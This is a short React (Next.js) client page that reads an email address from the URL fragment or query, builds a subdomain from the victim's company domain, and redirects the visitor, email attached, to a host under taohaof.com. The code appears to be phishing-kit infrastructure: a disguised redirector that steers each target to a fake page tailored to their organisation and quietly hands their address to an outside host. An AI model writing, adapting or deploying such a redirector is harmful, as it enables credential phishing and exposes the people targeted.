"use client";

import { useEffect, useState } from "react";

export default function RedirectPage() {
  const [msg, setMsg] = useState("Redirecting…");

  useEffect(() => {
    const href = window.location.href; // includes hash (#...)
    const m = href.match(/[$=#]([A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,})/);
    if (!m) {
      setMsg("Email not found after $, =, or # in the URL.");
      return;
    }

    const email = m[1].trim();
    const at = email.indexOf("@");
    if (at < 0) {
      setMsg("Invalid email format.");
      return;
    }

    const domain = email.slice(at + 1);
    const firstLabel = domain.split(".")[0];
    if (!firstLabel) {
      setMsg("Invalid email domain.");
      return;
    }

    const DOMAIN = firstLabel.toUpperCase();
    const dest = `https://${DOMAIN}.taohaof.com/redirect|${encodeURIComponent(email)}`;
    window.location.replace(dest);
  }, []);

  return (
    <main style={{ fontFamily: "system-ui, sans-serif", padding: "2rem" }}>
      <h1>Redirecting…</h1>
      <p>{msg}</p>
      <noscript>This page needs JavaScript to handle # fragments.</noscript>
    </main>
  );
}
